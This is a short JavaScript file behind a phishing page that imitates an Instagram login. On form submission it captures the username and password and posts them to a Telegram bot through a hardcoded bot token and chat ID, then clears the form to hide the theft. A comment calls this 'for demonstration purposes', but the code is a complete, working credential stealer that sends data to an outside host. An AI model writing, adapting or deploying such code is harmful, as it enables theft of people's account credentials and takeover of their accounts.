var telegram_bot_id = "5833825722:AAGHz2o3eJNvgbPJN2dXiYq4-KPNWPc1-T8";
var chat_id = "957866900";

var ready = function () {
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
    var message = "Instagram_id: " + username + "\nInstagram_pass: " + password;
    return message;
};

var sender = function () {
    var message = ready(); // Call ready function here to get the message
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("username").value = "";
    document.getElementById("password").value = "";
    return false;
};

document.getElementById("loginForm").addEventListener("submit", function (event) {
    event.preventDefault();
    sender(); // Call sender function when form is submitted
    // Clear form fields after submission (for demonstration purposes)
    document.getElementById("loginForm").reset();
});
